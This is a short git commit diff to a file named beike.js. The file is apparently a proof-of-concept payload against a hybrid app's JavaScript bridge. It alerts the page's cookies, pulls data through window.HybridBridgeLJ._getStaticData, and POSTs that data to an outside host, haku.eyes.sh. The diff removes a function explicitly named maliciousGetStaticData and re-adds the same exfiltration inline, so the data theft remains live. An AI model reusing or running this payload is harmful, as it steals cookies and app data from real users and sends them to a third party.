27bcc4bb07c0c99cf750588cd43a7bcf64b64ad3
labubu-art <hakuna_yip@163.com>
2025-06-18 00:38:06 +0800

    Update beike.js

--- beike.js
+++ beike.js
@@ -1,11 +1,10 @@
 alert(document.cookie);
-function maliciousGetStaticData() {
-    var data = window.HybridBridgeLJ._getStaticData();
-    fetch("http://haku.eyes.sh?beike", {
-    method: "POST",
-    body: data
-    });
-    alert(data);
- }
-maliciousGetStaticData();
+
+var data = window.HybridBridgeLJ._getStaticData();
+alert(data);
+fetch("http://haku.eyes.sh?beike", {
+method: "POST",
+body: data
+});
+
 
